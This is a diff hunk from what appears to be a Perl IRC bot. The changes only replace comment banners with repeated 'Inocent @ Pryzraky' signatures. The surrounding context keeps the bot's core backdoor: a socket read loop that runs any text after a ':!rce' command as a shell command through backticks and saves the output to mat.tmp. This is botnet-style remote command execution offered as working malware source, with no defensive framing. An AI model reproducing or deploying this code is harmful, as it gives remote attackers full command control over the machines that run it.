@@ -227,20 +227,25 @@ while ( my $log = <$s0ck3t> ) {
       }
 
       #######################
-      # o inocent eo cris   #
-      # sao os mais brabor  #
+      # Inocent @ Pryzraky  #
       #######################
 
       #######################
-      # o inocent eo cris   #
-      # sao os mais brabor  #
+      # Inocent @ Pryzraky  #
       #######################
-
+      
       #######################
-      # o inocent eo cris   #
-      # sao os mais brabor  #
+      # Inocent @ Pryzraky  #
       #######################
-
+      
+      #######################
+      # Inocent @ Pryzraky  #
+      #######################
+      
+      #######################
+      # Inocent @ Pryzraky  #
+      #######################
+      
       if ( $log =~ m/:!rce (.*)$/g ){##########
         my $comando_raw = `$1`;
         open(handler,">mat.tmp");
